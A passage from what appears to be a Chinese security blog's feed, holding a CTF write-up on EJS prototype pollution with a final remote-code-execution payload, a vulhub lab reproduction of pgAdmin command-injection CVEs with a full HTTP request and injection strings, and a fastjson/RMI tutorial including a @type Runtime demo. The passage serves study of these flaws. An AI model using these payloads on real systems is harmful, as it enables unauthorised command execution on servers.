<p>分析一下，<code>app.set(&#39;view engine&#39;, &#39;ejs&#39;);</code>说明ejs模板是默认配置，在<code>/greet</code>路由下，接收GET参数并赋值给data变量，然后黑名单检测，调用ejs模板进行渲染其中解析data的json数据，说明ejs配置可控。</p>
<p>我们前文利用的payload是有escapeFunction关键字的，并且污染的过程是我们手动添加<code>/vuln</code>上去的，所以我们要寻找可以利用的地方</p>
<p>通常情况下，ejs模板只允许在数据对象中传递以下相对无害的选项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var _OPTS_PASSABLE_WITH_DATA = [&#x27;delimiter&#x27;, &#x27;scope&#x27;, &#x27;context&#x27;, &#x27;debug&#x27;, &#x27;compileDebug&#x27;,</span><br><span class="line">  &#x27;client&#x27;, &#x27;_with&#x27;, &#x27;rmWhitespace&#x27;, &#x27;strict&#x27;, &#x27;filename&#x27;, &#x27;async&#x27;];</span><br><span class="line">// We don&#x27;t allow &#x27;cache&#x27; option to be passed in the data obj for</span><br><span class="line">// the normal `render` call, but this is where Express 2 &amp; 3 put it</span><br><span class="line">// so we make an exception for `renderFile`</span><br><span class="line">var _OPTS_PASSABLE_WITH_DATA_EXPRESS = _OPTS_PASSABLE_WITH_DATA.concat(&#x27;cache&#x27;);</span><br></pre></td></tr></table></figure>

<p>但是我们找到<code>settings[&#39;view options&#39;]</code>可用于将任意选项传递给EJS，这将是我们利用的点</p>
<p>跟进一下，会调用shallowCopy()进行赋值给opts</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">viewOpts = data.settings[&#x27;view options&#x27;];</span><br><span class="line">if (viewOpts) &#123;</span><br><span class="line">  utils.shallowCopy(opts, viewOpts);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而在渲染模板的时候会跟进到Template类中，发现关键语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;</span><br></pre></td></tr></table></figure>

<p>也就是说虽然escapeFunction被过滤了，但是我们可以利用opts.escape去替换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">settings[&#x27;view options&#x27;][escape]=...</span><br></pre></td></tr></table></figure>

<p>将前文漏洞利用的payload稍加修改一下，然后添加上greet.ejs中的三个配置参数</p>
<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106171750370.png"></p>
<p>得到最终payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/greet?name=test&amp;font=test&amp;fontSize=test&amp;settings[view options][escape]=function()&#123;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;/readflag&#x27;)&#125;&amp;settings[view options][client]=1</span><br></pre></td></tr></table></figure>

<p>注：题目源码已经<code>JSON.stringify</code>了，<code>/readflag</code>可以在dockerfile中得到信息</p>
<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106175700268.png"></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>模板注入</tag>
        <tag>原型链污染</tag>
      </tags>
  </entry>
  <entry>
    <title>pgAdmin命令执行漏洞</title>
    <url>/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</url>
    <content><![CDATA[<p>注意到p神在paper发的一篇跟pgAdmin命令执行漏洞有关的文章，所以利用vulhub靶场环境复现一下</p>
<span id="more"></span>

<h1 id="pgAdmin命令执行漏洞"><a href="#pgAdmin命令执行漏洞" class="headerlink" title="pgAdmin命令执行漏洞"></a>pgAdmin命令执行漏洞</h1><p><a href="https://paper.seebug.org/3144/#2-cve-2023-5002pgadmin-76">参考文章</a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
<p>pgAdmin是一种开源的数据库管理工具，它用于管理和操作PostgreSQL数据库。PostgreSQL是一种功能强大的关系型数据库系统，而pgAdmin则是一个用于管理和维护这个数据库系统的图形用户界面（GUI）工具。</p>
</blockquote>
<p>本文复现关于pgAdmin的两个命令执行漏洞，结合源码进行分析 <a href="https://pgadmin-archive.postgresql.org/pgadmin4/index.html">源码链接</a></p>
<h2 id="pgAdmin"><a href="#pgAdmin" class="headerlink" title="pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）"></a>pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）</h2><p>pgAdmin支持在后台设置psql、pg_dump、pg_restore等PostgreSQL数据库工具所在的基础路径，在保存设置前，用户可以执行<code>validate_binary_path</code>这个API来检查路径是否合法。</p>
<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409223437075.png"></p>
<p>这里用户传入的<code>utility_path</code>拼接上可执行文件名后，直接拼接进<code>subprocess.getoutput()</code>方法执行。这是一个非常简单的命令注入漏洞。而且这个API没有增加<code>@login_required</code>修饰器，任意用户均可调用这个函数，导致了在<code>/misc/validate_binary_path</code>路由下的未授权命令执行漏洞。</p>
<p>在本地搭建环境，访问5050端口是登录界面</p>
<p>然后我们抓包在accept头添加<code>application/json</code>，成功获取token值</p>
<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409224520953.png"></p>
<p>将获取到的<code>session id</code>和<code>csrf token</code>填写进去发包，并添加上执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /misc/validate_binary_path HTTP/1.1</span><br><span class="line">Host: 192.168.132.1:5050</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">X-pgA-CSRFToken: IjMyODM1ZTI2OGEzNjM3NmRiYzIyNDQ0YTFkNjQ3YzI4NWZmNDMwZmQi.ZhVW6g.9aUPlOreLBBdKoERuk8XTHn2bvE</span><br><span class="line">Accept: application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Cookie: pga4_session=698f6cec-3920-409a-8a39-cee41d7b7815!5R1QUKdHv1IxxFVR1iKc3HwVy0gN3hizTfVj3xTSjhI=</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">&#123;&quot;utility_path&quot;:&quot;a\&quot;;id;#&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>payload将前面的双引号闭合后，用<code>#</code>将后面代码注释掉</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">subprocess.getoutput(&#x27;&quot;a\&quot;;id;#&quot; --version&#x27;.format(full_path))</span><br></pre></td></tr></table></figure>

<p>成功命令执行，返回包如下</p>
<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409231120579.png"></p>
<h2 id="pgAdmin-1"><a href="#pgAdmin-1" class="headerlink" title="pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）"></a>pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）</h2><p>官方对于CVE-2022-4223漏洞，做了如下两个处理：</p>
<ul>
<li>给<code>validate_binary_path</code>函数增加<code>@login_required</code>装饰器，限制未授权的用户访问相关接口  </li>
<li>使用<code>os.path.exists()</code>检查用户传入的路径是否有效</li>
</ul>
<p><code>@login_required</code>装饰器是由Flask-Login这个第三方库提供的能力，并不存在绕过的问题，所以这个API后续就没法再无授权的情况下利用了。</p>
<p>对于使用<code>os.path.exists()</code>检查用户传入的路径是否存在，我们可以有两个绕过方法：</p>
<ul>
<li>使用<code>../</code>跳转到一个存在的目录，如：<code>/path/to/exist/folder/a&quot;;id;/../</code></li>
<li>通过文件上传等功能创建一个文件名中包含Payload的文件</li>
</ul>
<p>对于第一个方法来说（注意php和python环境都行）判断文件存在时，Windows会将路径normalize后再判断，Linux会逐级判断文件夹是否存在，因此具体执行结果也会不同</p>
<p>Windows下返回结果为True</p>
<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409232705036.png"></p>
<p>而Linux下返回结果为False</p>
<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409234553656.png"></p>
<p>所以在Windows环境下我们可以直接绕过<code>os.path.exists()</code>继续注入命令，但Linux下则无法实现命令执行</p>
<p>搭建环境，使用帐号<code>vulhub@example.com</code>和密码<code>vulhub</code>登录pgAdmin</p>
<p>然后访问<code>工具 =&gt; 存储管理器</code>，创建目录<code>&quot;;id;#</code></p>
<p>这样在与<code>/var/lib/pgadmin/storage/vulhub_example.com/</code>拼接后的绝对路径，用于漏洞利用</p>
<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130307002.png"></p>
<p>访问<code>设置 =&gt; 配置 =&gt;路径</code>界面，然后添加上刚刚拼接的绝对路径，点击验证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/pgadmin/storage/vulhub_example.com/&quot;;id;#</span><br></pre></td></tr></table></figure>

<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130919337.png"></p>
<p>成功命令执行</p>
<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410131015271.png"></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>fastjson入门学习</title>
    <url>/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0.html</url>
    <content><![CDATA[<p>记录对java安全的初次探索</p>
<span id="more"></span>

<h1 id="fastjson入门学习"><a href="#fastjson入门学习" class="headerlink" title="fastjson入门学习"></a>fastjson入门学习</h1><p><a href="https://xz.aliyun.com/t/13386?time__1311=mqmxnDBG0QQeqGNDQi5BKvC7Dc7oF3d4D&alichlgref=https://xz.aliyun.com/u/56767">参考文章</a></p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><strong>简介</strong></p>
<blockquote>
<p>Fastjson是一个Java语言编写的高性能JSON解析库，它提供了强大的JSON处理能力，能够在Java对象和JSON之间进行快速、灵活的相互转换。</p>
</blockquote>
<h3 id="fastjson如何用"><a href="#fastjson如何用" class="headerlink" title="fastjson如何用"></a>fastjson如何用</h3><p>在IDEA创建一个maven项目，打开pox.xml在末尾添加如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.2.50&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240320225857395.png"></p>
<p>添加完记得点击右侧的maven重新加载</p>
<p>然后就可以编写简单的demo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 将一个 Java 对象序列化为 JSON 字符串</span><br><span class="line">        Person person = new Person(&quot;Alice&quot;, 18);</span><br><span class="line">        String jsonString = JSON.toJSONString(person);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line"></span><br><span class="line">        // 将一个 JSON 字符串反序列化为 Java 对象</span><br><span class="line">        String jsonString2 = &quot;&#123;\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;Bob\&quot;&#125;&quot;;</span><br><span class="line">        Person person2 = JSON.parseObject(jsonString2, Person.class);</span><br><span class="line">        System.out.println(person2.getName() + &quot;, &quot; + person2.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 定义一个简单的 Java 类</span><br><span class="line">    public static class Person &#123;</span><br><span class="line">        private String name;</span><br><span class="line">        private int age;</span><br><span class="line"></span><br><span class="line">        public Person(String name, int age) &#123;</span><br><span class="line">            this.name = name;</span><br><span class="line">            this.age = age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public String getName() &#123;</span><br><span class="line">            return name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public int getAge() &#123;</span><br><span class="line">            return age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码很好的展示了Fastjson应用的方便之处，可以将Java对象和JSON之间快速转换，执行结果如下</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240320230127970.png"></p>
<p>此外我们可以注意到下面这行代码的表述吗，用的是<code>Person.class</code>来直接进行映射，这是由于<code>Java</code>类的属性名和<code>JSON</code>字段名是相同的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Person person2 = JSON.parseObject(jsonString2, Person.class);</span><br></pre></td></tr></table></figure>

<p>如果不相同的话，可以使用<code>@JSONField</code>注解来指定<code>Java</code>类的属性和<code>JSON</code>字段之间的映射关系</p>
<p>demo如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.annotation.JSONField;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 将一个 Java 对象序列化为 JSON 字符串</span><br><span class="line">        Person person = new Person(&quot;Alice&quot;, 18);</span><br><span class="line">        String jsonString = JSON.toJSONString(person);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line"></span><br><span class="line">        // 将一个 JSON 字符串反序列化为 Java 对象</span><br><span class="line">        String jsonString2 = &quot;&#123;\&quot;user_age\&quot;:20,\&quot;user_name\&quot;:\&quot;Bob\&quot;&#125;&quot;;</span><br><span class="line">        Person person2 = JSON.parseObject(jsonString2, Person.class);</span><br><span class="line">        System.out.println(person2.getName() + &quot;, &quot; + person2.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 定义一个简单的 Java 类</span><br><span class="line">    public static class Person &#123;</span><br><span class="line">        @JSONField(name = &quot;user_name&quot;)</span><br><span class="line">        private String name;</span><br><span class="line">        @JSONField(name = &quot;user_age&quot;)</span><br><span class="line">        private int age;</span><br><span class="line">        public Person(String name, int age) &#123;</span><br><span class="line">            this.name = name;</span><br><span class="line">            this.age = age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public String getName() &#123;</span><br><span class="line">            return name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public int getAge() &#123;</span><br><span class="line">            return age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下，会发现也能成功在<code>Java</code>类的属性和<code>JSON</code>字段之间进行转换</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240320231233090.png"></p>
<p>我们注意到明明实例化的是<code>Person person = new Person(&quot;Alice&quot;, 18);</code>为什么属性顺序是反过来的，原因是在<code>fastjson</code>中，默认情况下，生成的<code>JSON</code>字符串的顺序是按照<strong>属性的字母顺序</strong>进行排序的，而不是按照属性在类中的声明顺序。如果我们希望按照属性在类中的声明顺序来生成<code>JSON</code>字符串，可以通过在类中使用<code>@JSONType</code>注解来设置属性的序列化顺序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.annotation.JSONType;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 将一个 Java 对象序列化为 JSON 字符串</span><br><span class="line">        Person person = new Person(&quot;Alice&quot;, 18);</span><br><span class="line">        String jsonString = JSON.toJSONString(person);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line"></span><br><span class="line">        // 将一个 JSON 字符串反序列化为 Java 对象</span><br><span class="line">        String jsonString2 = &quot;&#123;\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;Bob\&quot;&#125;&quot;;</span><br><span class="line">        Person person2 = JSON.parseObject(jsonString2, Person.class);</span><br><span class="line">        System.out.println(person2.getName() + &quot;, &quot; + person2.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 定义一个简单的 Java 类</span><br><span class="line">    @JSONType (orders = &#123;&quot;name&quot;,&quot;age&quot;&#125;)</span><br><span class="line">    public static class Person &#123;</span><br><span class="line">        private String name;</span><br><span class="line">        private int age;</span><br><span class="line">        public Person(String name, int age) &#123;</span><br><span class="line">            this.name = name;</span><br><span class="line">            this.age = age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public String getName() &#123;</span><br><span class="line">            return name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public int getAge() &#123;</span><br><span class="line">            return age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们通过<code>@JSONType(orders = &#123;&quot;name&quot;, &quot;age&quot;&#125;)</code>来指定属性的序列化顺序，这样就是<code>name</code>在前，<code>age</code>在后了</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240320231946636.png"></p>
<p>了解一些基本的注解后我们来看看<code>@type</code></p>
<blockquote>
<p><code>@type</code>是<code>fastjson</code>中的一个特殊注解，用于标识<code>JSON</code>字符串中的某个属性是一个<code>Java</code>对象的类型。具体来说，当<code>fastjson</code>从<code>JSON</code>字符串反序列化为<code>Java</code>对象时，如果<code>JSON</code>字符串中包含<code>@type</code>属性，<code>fastjson</code>会根据该属性的值来确定反序列化后的<code>Java</code>对象的类型。</p>
</blockquote>
<p>测试代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        String json=&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;&#125;&quot;;</span><br><span class="line">        ParserConfig.getGlobalInstance().addAccept(&quot;java.lang&quot;);</span><br><span class="line">        Runtime runtime=(Runtime) JSON.parseObject(json, Object.class);</span><br><span class="line">        runtime.exec(&quot;calc.exe&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们详细分析下代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.IOException;</span><br></pre></td></tr></table></figure>

<p>我们导入Java标准库中的IOException异常类，因为如果发生了I&#x2F;O错误（如本demo的弹calc），又或者无法执行命令或读取命令输出时，会抛出<code>IOException</code>。</p>
<p>我们先定义json其中<code>@type</code>属性的值为<code>java.lang.Runtime</code>，然后执行下面语句指定在JSON解析过程中，允许反序列化指定的类或包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().addAccept(&quot;java.lang&quot;);</span><br></pre></td></tr></table></figure>

<p>接着使用<code>parseObject</code>方法，将JSON字符串解析为Java对象</p>
<p>（由于<code>fastjson</code>在<code>1.2.24</code>之后默认禁用<code>AutoType</code>，因此这里我们通过下面命令来开启，否则会报错<code>autoType is not support</code>。）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime runtime=(Runtime) JSON.parseObject(json, Object.class);</span><br></pre></td></tr></table></figure>

<p>然后成功弹出计算器</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240323224255702.png"></p>
<p>我们继续看下面demo，先创建Person.java</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">public class Person &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line">    public Person()&#123;&#125;</span><br><span class="line"></span><br><span class="line">    public String toString()&#123;</span><br><span class="line">        return &quot;Person&#123;&quot;+&quot;name=&quot;+name+&quot;, age=&quot;+age+&#x27;&#125;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public Person(String name,int age)&#123;</span><br><span class="line">        this.name=name;</span><br><span class="line">        this.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    public String getName()&#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line">    public void setName(String name)&#123;</span><br><span class="line">        this.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    public int getAge()&#123;</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line">    public void setAge(int age)&#123;</span><br><span class="line">        this.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后再看向main.java</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        Person user=new Person();</span><br><span class="line">        user.setName(&quot;rev1ve&quot;);</span><br><span class="line">        user.setAge(18);</span><br><span class="line">        String s1=JSON.toJSONString(user,SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(s1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果为</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240323231657962.png"></p>
<p>与前面代码对比，可以发现其实就是在调用<code>toJSONString</code>方法的时候，参数里面多了一个<code>SerializerFeature.WriteClassName</code>方法。传入<code>SerializerFeature.WriteClassName</code>可以使得<code>Fastjson</code>支持自省，开启自省后序列化成<code>JSON</code>的数据就会多一个<code>@type</code>，这个是代表对象类型的<code>JSON</code>文本。<code>FastJson</code>的漏洞就是他的这一个功能去产生的在对该<code>JSON</code>数据进行反序列化的时候，会去调用指定类中对于的<code>get/set/is</code>方法， 后面会详细分析</p>
<p>然后我们可以通过以下三种方式来反序列化<code>json</code>字符串了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 方法一（返回JSONObject对象）：</span><br><span class="line">Person user = new Person();</span><br><span class="line">user.setAge(18);</span><br><span class="line">user.setName(&quot;rev1ve&quot;);</span><br><span class="line">String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">JSONObject jsonObject = JSON.parse(s1);</span><br><span class="line">System.out.println(jsonObject);</span><br><span class="line"></span><br><span class="line">// 方法二：</span><br><span class="line">Person user = new Person();</span><br><span class="line">user.setAge(18);</span><br><span class="line">user.setName(&quot;rev1ve&quot;);</span><br><span class="line">String s = JSON.toJSONString(user);</span><br><span class="line">Person user1 = JSON.parseObject(s, Person.class);  //反序列化转化为目标类型Person类</span><br><span class="line">System.out.println(user1);</span><br><span class="line"></span><br><span class="line">// 方法三：</span><br><span class="line">Person user = new Person();</span><br><span class="line">user.setAge(18);</span><br><span class="line">user.setName(&quot;rev1ve&quot;);</span><br><span class="line">String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">Person user1 = JSON.parseObject(s1,Person.class);</span><br><span class="line">System.out.println(user1);</span><br></pre></td></tr></table></figure>

<p>执行结果均为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Person&#123;name=rev1ve, age=18&#125;</span><br></pre></td></tr></table></figure>



<h3 id="JNDI是什么"><a href="#JNDI是什么" class="headerlink" title="JNDI是什么"></a>JNDI是什么</h3><blockquote>
<p><code>JNDI</code>是<code>Java</code>平台的一种<code>API</code>，它提供了访问各种命名和目录服务的统一方式。<code>JNDI</code>通常用于在<code>JavaEE</code>应用程序中查找和访问资源，如<code>JDBC</code>数据源、<code>JMS</code>连接工厂和队列等。</p>
</blockquote>
<h3 id="RMI是什么"><a href="#RMI是什么" class="headerlink" title="RMI是什么"></a>RMI是什么</h3><blockquote>
<p><code>RMI</code>指的是远程方法调用（<code>Remote Method Invocation</code>），是<code>Java</code>平台提供的一种机制，可以实现在不同<code>Java</code>虚拟机之间进行方法调用。</p>
</blockquote>
<p>我们直接看下面使用了<code>RMI</code>的<code>demo</code>代码，包括一个服务器端和一个客户端。这个<code>demo</code>实现了一个简单的计算器程序，客户端通过<code>RMI</code>调用服务器端的方法进行加、减、乘、除四则运算。</p>
<p>Calculator.java(计算机接口)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">public interface Calculator extends Remote &#123;</span><br><span class="line">    public int add(int a,int b) throws RemoteException;</span><br><span class="line">    public int subtract(int a,int b) throws RemoteException;</span><br><span class="line">    public int multiply(int a,int b) throws RemoteException;</span><br><span class="line">    public int divide(int a,int b) throws RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>public interface Calculator extends Remote</code>表示此接口是远程接口，提供加减乘除的运算操作</p>
<p>Server.java(服务端)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;//作用是导出远程对象</span><br><span class="line"></span><br><span class="line">public class Server extends UnicastRemoteObject implements Calculator &#123;</span><br><span class="line">    public Server() throws RemoteException&#123;&#125;</span><br><span class="line">    public int add(int x, int y) throws RemoteException &#123;</span><br><span class="line">        return x + y;</span><br><span class="line">    &#125;</span><br><span class="line">    public int subtract(int a, int b) throws RemoteException &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    public int multiply(int a, int b) throws RemoteException &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    public int divide(int a, int b) throws RemoteException &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            Server obj=new Server();</span><br><span class="line">            //在端口号1028上创建RMI注册表</span><br><span class="line">            LocateRegistry.createRegistry(1028);</span><br><span class="line">            //获取指定1028端口上的RMI注册表实例的代码</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1028);</span><br><span class="line">            //将远程对象Calculator绑定到RMI注册表的代码</span><br><span class="line">            registry.bind(&quot;Calculator&quot;, obj);</span><br><span class="line">            System.out.println(&quot;Server ready&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            System.err.println(&quot;Server exception: &quot; + e.toString());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Client.java(客户端)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class Client &#123;</span><br><span class="line">    private Client()&#123;&#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            //获取localhost指定1028端口上的RMI注册表实例的代码</span><br><span class="line">            Registry registry=LocateRegistry.getRegistry(&quot;localhost&quot;,1028);</span><br><span class="line">            //寻找registry的远程对象Calculator</span><br><span class="line">            Calculator calc=(Calculator) registry.lookup(&quot;Calculator&quot;);</span><br><span class="line">            //调用远程方法</span><br><span class="line">            int result=calc.add(5,7);</span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;Result:&quot;+result);</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            System.err.println(&quot;Client exception: &quot; + e.toString());</span><br><span class="line">            